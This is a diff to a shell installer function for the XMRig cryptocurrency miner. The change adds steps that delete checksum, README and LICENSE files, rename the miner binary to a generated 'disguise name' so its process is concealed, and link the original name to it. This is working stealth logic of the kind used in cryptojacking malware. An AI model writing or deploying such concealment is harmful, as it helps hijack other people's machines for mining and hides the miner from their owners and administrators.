@@ -410,17 +410,37 @@ download_and_install() {
         rm -f "$WORK_DIR/config.json"
     fi
     
-    # Get disguise name before renaming
-    get_disguise_name
+    # Clean up unnecessary files
+    log_info "Cleaning up unnecessary files..."
+    rm -f SHA256SUMS 2>/dev/null || true
+    rm -f *.txt 2>/dev/null || true
+    rm -f README* 2>/dev/null || true
+    rm -f LICENSE* 2>/dev/null || true
+    
+    # Get disguise name before renaming (refresh the name)
+    local disguise_name=$(get_disguise_name)
+    
+    # Set execute permissions for original file
+    chmod +x xmrig
+    
+    # Process name disguise
+    log_info "Setting up process disguise..."
+    log_info "Renaming xmrig to: $disguise_name"
     
     # Rename xmrig to disguise name
-    mv xmrig "$DISGUISE_NAME"
+    mv xmrig "$disguise_name" || {
+        log_error "Failed to rename xmrig"
+        exit 1
+    }
     
-    # Set execute permissions
-    chmod +x "$DISGUISE_NAME"
+    # Set execute permissions for disguised file
+    chmod +x "$disguise_name"
     
     # Create symlink with original name for compatibility
-    ln -sf "$DISGUISE_NAME" xmrig
+    ln -sf "$disguise_name" xmrig
+    
+    # Update global variable
+    DISGUISE_NAME="$disguise_name"
     
     log_info "XMRig installation completed with disguise name: $DISGUISE_NAME"
 }
